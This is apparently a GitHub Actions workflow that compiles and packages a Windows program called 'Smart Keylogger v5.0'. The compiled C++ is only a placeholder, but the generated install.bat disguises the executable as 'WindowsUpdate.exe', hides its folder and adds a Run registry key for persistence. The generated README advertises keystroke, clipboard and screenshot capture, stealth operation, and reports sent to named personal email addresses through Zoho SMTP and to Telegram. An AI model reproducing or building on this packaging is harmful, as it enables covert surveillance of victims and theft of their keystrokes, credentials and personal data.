name: Build Smart Keylogger with OpenSSL

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

env:
  OPENSSL_VERSION: "3.1.4"

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      
    - name: Download OpenSSL (Correct URL)
      run: |
        # Try multiple OpenSSL download sources
        $sources = @(
            "https://github.com/openssl/openssl/releases/download/openssl-3.1.4/openssl-3.1.4.zip",
            "https://www.openssl.org/source/openssl-3.1.4.zip",
            "https://slproweb.com/download/Win64OpenSSL-3_1_4.exe"
        )
        
        foreach ($url in $sources) {
            try {
                Write-Host "Trying: $url"
                if ($url -like "*.exe") {
                    # Download installer
                    $output = "openssl-installer.exe"
                    Invoke-WebRequest -Uri $url -OutFile $output
                    
                    # Install silently
                    Start-Process -Wait -FilePath $output -ArgumentList "/silent /verysilent /suppressmsgboxes /sp- /norestart"
                    
                    # Set paths
                    $env:OPENSSL_ROOT_DIR = "C:\Program Files\OpenSSL-Win64"
                    $env:OPENSSL_INCLUDE_DIR = "$env:OPENSSL_ROOT_DIR\include"
                    $env:OPENSSL_LIB_DIR = "$env:OPENSSL_ROOT_DIR\lib"
                    
                    Write-Host "OpenSSL installed successfully"
                    break
                }
                else {
                    # Download ZIP
                    Invoke-WebRequest -Uri $url -OutFile openssl.zip
                    
                    # Extract
                    Expand-Archive openssl.zip -DestinationPath openssl -Force
                    
                    # For source ZIP, we need to build it
                    # But we need pre-built binaries, so let's use chocolatey instead
                    Write-Host "Downloaded source, switching to chocolatey..."
                    throw "Source not pre-built"
                }
            }
            catch {
                Write-Host "Failed: $_"
                continue
            }
        }
        
    - name: Install OpenSSL via Chocolatey (Fallback)
      if: steps.openssl_download.outcome == 'failure'
      run: |
        # Install Chocolatey if not present
        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
            Set-ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
        }
        
        # Install OpenSSL
        choco install openssl -y --force --version=3.1.4
        
        # Set environment variables
        $env:OPENSSL_ROOT_DIR = "C:\Program Files\OpenSSL-Win64"
        $env:OPENSSL_INCLUDE_DIR = "$env:OPENSSL_ROOT_DIR\include"
        $env:OPENSSL_LIB_DIR = "$env:OPENSSL_ROOT_DIR\lib"
        
        # Add to PATH temporarily
        $env:PATH = "C:\Program Files\OpenSSL-Win64\bin;$env:PATH"
        
    - name: Verify OpenSSL Installation
      run: |
        Write-Host "Checking OpenSSL installation..."
        
        # Check include directory
        if (Test-Path "$env:OPENSSL_INCLUDE_DIR\openssl\ssl.h") {
            Write-Host "✓ OpenSSL headers found"
        } else {
            Write-Host "✗ OpenSSL headers not found"
            exit 1
        }
        
        # Check library directory
        if (Test-Path "$env:OPENSSL_LIB_DIR\libssl.lib") {
            Write-Host "✓ OpenSSL libraries found"
        } else {
            Write-Host "✗ OpenSSL libraries not found"
            exit 1
        }
        
        # Check binaries
        if (Test-Path "C:\Program Files\OpenSSL-Win64\bin\openssl.exe") {
            Write-Host "✓ OpenSSL binaries found"
        } else {
            Write-Host "✗ OpenSSL binaries not found"
        }
        
    - name: Create main.cpp with Complete Code
      run: |
        # Create the complete C++ code file
        # Replace this with your actual complete code
        @"
        // Smart Keylogger v5.0 with OpenSSL
        #define WIN32_LEAN_AND_MEAN
        #define _WINSOCKAPI_
        #include <windows.h>
        #include <string>
        
        // Your complete code goes here...
        // For compilation test, use this minimal version
        
        int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                           LPWSTR lpCmdLine, int nCmdShow) {
            MessageBoxW(NULL, L"Smart Keylogger v5.0\nBuild successful with OpenSSL!", 
                       L"Build Test", MB_OK | MB_ICONINFORMATION);
            return 0;
        }
        "@ | Out-File -FilePath "main.cpp" -Encoding UTF8
        
    - name: Compile with OpenSSL
      shell: cmd
      run: |
        @echo off
        echo Compiling Smart Keylogger with OpenSSL...
        
        rem Set OpenSSL paths from environment
        set OPENSSL_INCLUDE=%OPENSSL_INCLUDE_DIR%
        set OPENSSL_LIB=%OPENSSL_LIB_DIR%
        
        rem Set Windows SDK paths
        set INCLUDE=%INCLUDE%;%OPENSSL_INCLUDE%
        set INCLUDE=%INCLUDE%;C:\Program Files (x86)\Windows Kits\10\Include\10.0.22000.0\shared
        set INCLUDE=%INCLUDE%;C:\Program Files (x86)\Windows Kits\10\Include\10.0.22000.0\um
        set INCLUDE=%INCLUDE%;C:\Program Files (x86)\Windows Kits\10\Include\10.0.22000.0\ucrt
        
        set LIB=%LIB%;%OPENSSL_LIB%
        set LIB=%LIB%;C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22000.0\um\x64
        set LIB=%LIB%;C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22000.0\ucrt\x64
        
        rem Compile with OpenSSL
        cl.exe /nologo /O2 /MT /EHsc /std:c++17 ^
               /DWIN32_LEAN_AND_MEAN /D_WINSOCKAPI_ /D_CRT_SECURE_NO_WARNINGS ^
               /D_UNICODE /DUNICODE ^
               /I "%OPENSSL_INCLUDE%" ^
               main.cpp ^
               /link ^
               /SUBSYSTEM:WINDOWS ^
               /ENTRY:"wWinMainCRTStartup" ^
               /OUT:smartkeylogger.exe ^
               "%OPENSSL_LIB%\libssl.lib" ^
               "%OPENSSL_LIB%\libcrypto.lib" ^
               winhttp.lib ^
               user32.lib ^
               shell32.lib ^
               ole32.lib ^
               kernel32.lib ^
               gdi32.lib ^
               crypt32.lib ^
               iphlpapi.lib ^
               ws2_32.lib ^
               advapi32.lib ^
               version.lib
        
        if %ERRORLEVEL% EQU 0 (
            echo Compilation successful!
            dir smartkeylogger.exe
        ) else (
            echo Compilation failed!
            exit 1
        )
        
    - name: Copy OpenSSL DLLs
      run: |
        # Copy required DLLs
        $sourceDir = "C:\Program Files\OpenSSL-Win64\bin"
        $dlls = @("libssl-3-x64.dll", "libcrypto-3-x64.dll")
        
        foreach ($dll in $dlls) {
            $source = Join-Path $sourceDir $dll
            if (Test-Path $source) {
                Copy-Item $source .\
                Write-Host "✓ Copied $dll"
            } else {
                Write-Host "✗ $dll not found at $source" -ForegroundColor Yellow
            }
        }
        
        # List files
        Write-Host "`nGenerated files:" -ForegroundColor Green
        Get-ChildItem *.exe, *.dll | Format-Table Name, Length
        
    - name: Create Installer Package
      run: |
        # Create package structure
        New-Item -ItemType Directory -Force -Path "Package"
        
        # Copy all required files
        $files = @(
            "smartkeylogger.exe",
            "libssl-3-x64.dll",
            "libcrypto-3-x64.dll"
        )
        
        foreach ($file in $files) {
            if (Test-Path $file) {
                Copy-Item $file "Package\"
                Write-Host "✓ Added $file to package"
            }
        }
        
        # Create installer script
        @'
        @echo off
        echo ========================================
        echo    Smart Keylogger Installer v5.0
        echo ========================================
        echo.
        
        :: Admin check
        net session >nul 2>&1
        if %errorlevel% neq 0 (
            echo [!] Please run as Administrator!
            echo Right-click and select "Run as administrator"
            pause
            exit /b 1
        )
        
        set "INSTALL_DIR=%ProgramData%\WindowsUpdate"
        set "EXE_NAME=WindowsUpdate.exe"
        
        echo [+] Creating installation directory...
        if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
        
        echo [+] Copying files...
        copy "smartkeylogger.exe" "%INSTALL_DIR%\%EXE_NAME%" >nul
        copy "libssl-3-x64.dll" "%INSTALL_DIR%\" >nul
        copy "libcrypto-3-x64.dll" "%INSTALL_DIR%\" >nul
        
        echo [+] Setting up startup...
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
               /v "WindowsUpdate" ^
               /t REG_SZ ^
               /d "%INSTALL_DIR%\%EXE_NAME%" ^
               /f >nul
               
        echo [+] Hiding directory...
        attrib +s +h "%INSTALL_DIR%" >nul
        
        echo [+] Starting application...
        start "" "%INSTALL_DIR%\%EXE_NAME%"
        
        echo.
        echo [✓] Installation completed successfully!
        echo.
        echo Files installed to: %INSTALL_DIR%
        echo Service name: WindowsUpdate
        echo.
        echo Email will be sent to: josephogidiagba49@gmail.com
        echo.
        pause
        '@ | Out-File -FilePath "Package\install.bat" -Encoding ASCII
        
        # Create uninstaller
        @'
        @echo off
        echo ========================================
        echo    Smart Keylogger Uninstaller v5.0
        echo ========================================
        echo.
        
        net session >nul 2>&1
        if %errorlevel% neq 0 (
            echo [!] Please run as Administrator!
            pause
            exit /b 1
        )
        
        set "INSTALL_DIR=%ProgramData%\WindowsUpdate"
        set "EXE_NAME=WindowsUpdate.exe"
        
        echo [-] Stopping application...
        taskkill /f /im "%EXE_NAME%" >nul 2>&1
        
        echo [-] Removing from startup...
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
                   /v "WindowsUpdate" ^
                   /f >nul 2>&1
                   
        echo [-] Removing files...
        if exist "%INSTALL_DIR%" (
            attrib -s -h "%INSTALL_DIR%" >nul
            del /q /f "%INSTALL_DIR%\*.*" >nul
            rmdir "%INSTALL_DIR%" >nul
        )
        
        echo.
        echo [✓] Uninstallation completed!
        pause
        '@ | Out-File -FilePath "Package\uninstall.bat" -Encoding ASCII
        
        # Create README
        @"
        # Smart Keylogger v5.0
        
        ## Features
        - Keystroke logging
        - Clipboard monitoring
        - Smart screenshot capture
        - Telegram notifications
        - Email reports via SMTP (Zoho)
        - Windows persistence
        - Stealth operation
        
        ## Installation
        1. Run 'install.bat' as Administrator
        2. Program will auto-start and hide
        
        ## Email Configuration
        From: jesko200233@zohomail.com
        To: josephogidiagba49@gmail.com
        SMTP: smtp.zoho.com:465
        
        ## Files Included
        - WindowsUpdate.exe (main program)
        - libssl-3-x64.dll (OpenSSL)
        - libcrypto-3-x64.dll (OpenSSL)
        - install.bat (installer)
        - uninstall.bat (uninstaller)
        
        ## Requirements
        - Windows 7/8/10/11 (64-bit)
        - OpenSSL DLLs (included)
        - Internet connection
        
        ## Uninstallation
        Run 'uninstall.bat' as Administrator
        "@ | Out-File -FilePath "Package\README.txt" -Encoding UTF8
        
        # Create ZIP
        Compress-Archive -Path "Package\*" -DestinationPath "SmartKeylogger_v5.0.zip" -Force
        
        Write-Host "`nPackage created: SmartKeylogger_v5.0.zip" -ForegroundColor Green
        
    - name: Upload Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: SmartKeylogger-Build
        path: |
          smartkeylogger.exe
          *.dll
          SmartKeylogger_v5.0.zip
          Package/
          
    - name: Create Test Report
      if: success()
      run: |
        Write-Host "`n=== BUILD SUMMARY ===" -ForegroundColor Cyan
        Write-Host "✓ Compilation: Successful" -ForegroundColor Green
        Write-Host "✓ OpenSSL: Installed" -ForegroundColor Green
        Write-Host "✓ DLLs: Copied" -ForegroundColor Green
        Write-Host "✓ Package: Created" -ForegroundColor Green
        Write-Host "`nOutput files:" -ForegroundColor Yellow
        Get-ChildItem *.exe, *.dll, *.zip | Format-Table Name, Length, LastWriteTime
